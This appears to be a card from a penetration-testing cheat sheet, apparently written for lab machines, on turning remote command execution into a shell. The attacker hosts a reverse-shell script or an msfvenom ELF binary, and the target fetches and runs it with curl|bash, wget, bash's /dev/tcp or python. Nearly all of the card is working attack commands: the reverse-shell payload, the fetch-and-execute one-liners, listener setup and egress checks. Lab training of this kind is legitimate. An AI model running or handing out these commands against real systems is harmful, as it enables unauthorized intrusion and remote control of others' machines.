title: Hosted Shell — RCE to Session via curl/wget Fetch
body: Once you have command execution (RFI/LFI->RCE, SMTP injection, webshell, any &cmd= primitive), DON'T cram a reverse-shell one-liner into the exploit channel - the >, &, |, quotes and /dev/tcp get mangled by URL parsers, SMTP MAIL FROM filters, and shell quoting (this is what burned Snookums on URL-encoding and Bratarina on the 503 metacharacter filter). Instead: host the shell as a FILE on your box, and have the target fetch+run it. The only thing crossing the hostile channel is a trivially simple 'curl URL|bash' - no special characters to break. All the fragile syntax lives safely in the file. Two tracks: a bash SCRIPT (curl|bash, no chmod needed) or a compiled ELF BINARY (msfvenom, requires chmod +x). Pick the port the target can actually reach - egress is often 80/443 only, so default your callback there.
cmd:
# ══════════════════════════════════════════════════
# SETUP (your box) - host with PYTHON, never Apache (Apache executes .php before serving)
# ══════════════════════════════════════════════════
LHOST=192.168.45.211        # your tun0 IP
LPORT=80                    # match listener; 80/443 survive egress filtering

# ── TRACK A: bash script (no chmod - bash reads contents as input) ──
cat > shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF

python3 -m http.server 80   # serve the file (terminal 1)
nc -lvnp $LPORT             # listener (terminal 2)

# Fetch + run from the target via your RCE. NONE of these need chmod:
#   curl http://LHOST/shell.sh | bash
#   wget -qO- http://LHOST/shell.sh | bash
#   curl http://LHOST/shell.sh -o /tmp/s; bash /tmp/s        # if pipe | is filtered
#   wget http://LHOST/shell.sh -O /tmp/s; bash /tmp/s
# 'bash file' and '| bash' both feed CONTENTS to bash -> execute bit irrelevant.

# ══════════════════════════════════════════════════
# TRACK B: compiled ELF (msfvenom) - REQUIRES chmod +x (no interpreter to pipe to)
#   This is the official Bratarina method.
# ══════════════════════════════════════════════════
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=$LHOST LPORT=$LPORT
python3 -m http.server 80
nc -lvnp $LPORT
# Three fires from the target (binary CANNOT be bash'd, so chmod is mandatory):
#   wget http://LHOST/shell -O /tmp/shell
#   chmod +x /tmp/shell
#   /tmp/shell

# ══════════════════════════════════════════════════
# CHMOD RULE OF THUMB
#   curl|bash       -> NO chmod (contents piped to bash)
#   bash /tmp/s      -> NO chmod (file read as input)
#   ./tmp/s          -> chmod +x REQUIRED (OS executes file directly)
#   /tmp/shell (ELF) -> chmod +x REQUIRED (it's a binary)
# ══════════════════════════════════════════════════

# ── NO curl OR wget on the target? ──
# bash builtin /dev/tcp download (no tools needed):
#   exec 3<>/dev/tcp/LHOST/80; echo -e 'GET /shell.sh HTTP/1.0\r\n\r\n' >&3; cat <&3 | tail -n +12 > /tmp/s; bash /tmp/s
# python (if present):
#   python -c 'import urllib;urllib.urlretrieve("http://LHOST/shell.sh","/tmp/s")'; bash /tmp/s
#   python3 -c 'import urllib.request;urllib.request.urlretrieve("http://LHOST/shell.sh","/tmp/s")'; bash /tmp/s

# ── PROVE EGRESS FIRST if the callback won't land ──
sudo tcpdump -i tun0 icmp
#   <RCE> ping -c 3 LHOST     # replies = box can reach you; it's the port/payload, not the network
# Replies but no shell  -> wrong port (use 80/443).  No replies -> egress blocked, loot via RCE + pivot SSH.
warn: Host with python3 -m http.server, NOT Apache (Apache runs .php server-side and the target gets empty output). curl|bash and bash /tmp/s need NO chmod; a downloaded ELF or a ./file invocation DOES. Match your callback port to the listener and prefer 80/443 - restrictive boxes filter outbound on everything else, so the shell silently times out even though the fetch succeeded.

choices.label: Shell landed — upgrade to full TTY
Listener set up — catching the shell
No curl/wget — need other transfer methods
On the box — start Linux post-exploit enum
